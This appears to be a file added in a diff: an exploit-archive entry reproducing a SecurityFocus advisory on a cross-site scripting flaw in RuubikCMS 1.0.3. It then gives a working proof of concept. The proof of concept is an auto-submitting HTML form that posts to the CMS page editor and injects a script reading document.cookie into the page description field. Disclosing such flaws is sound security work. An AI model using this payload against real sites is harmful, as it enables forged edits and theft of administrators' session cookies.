@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/40375/info
+
+RuubikCMS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+RuubikCMS 1.0.3 is vulnerable; other versions may also be affected. 
+
+<form action="http://example.com/ruubikcms/cms/index.php?p=home" method="post" name="main" > <input type="hidden" name="save" value="1" /> <input type="hidden" name="ordernum" value="1" /> <input type="hidden" name="name" value="Home" /> <input type="hidden" name="header1" value="Home" /> <input type="hidden" name="pageurl" value="home" /> <input type="hidden" name="pagelink" value="%2Findex.php%2Fhome" /> <input type="hidden" name="mother_hidden" value="" /> <input type="hidden" name="creator" value="admin" /> <input type="hidden" name="title" value="" /> <input type="hidden" name="description" value='hello"><script>alert(document.cookie)</script>' /> <input type="hidden" name="keywords" value="" /> <input type="hidden" name="extracode" value="" /> <input type="hidden" name="picfile1" value="" /> <input type="hidden" name="picfile2" value="" /> <input type="hidden" name="tinyMCE" value="page content here..." /> </form> <script> document.main.submit(); </script>
